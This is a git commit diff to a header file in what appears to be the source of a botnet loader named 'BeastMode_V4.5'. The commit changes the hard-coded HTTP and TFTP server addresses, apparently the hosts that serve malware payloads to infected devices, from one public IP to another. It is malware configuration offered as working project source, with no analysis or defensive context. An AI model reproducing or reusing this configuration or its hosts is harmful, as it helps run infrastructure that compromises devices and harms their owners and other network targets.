a998d8a54c18e1b3fc24e4e36b45cc1aeab65707
lehbrusz <65790056+lehbrusz@users.noreply.github.com>
2020-06-20 13:28:39 -0300

    Update config.h

--- BeastMode_V4.5/loader/src/headers/config.h
+++ BeastMode_V4.5/loader/src/headers/config.h
@@ -1,6 +1,6 @@
 #pragma once
 
-#define HTTP_SERVER "104.36.19.100"
+#define HTTP_SERVER "162.213.38.71"
 #define HTTP_PORT 80
 
-#define TFTP_SERVER "104.36.19.100"
+#define TFTP_SERVER "162.213.38.71"
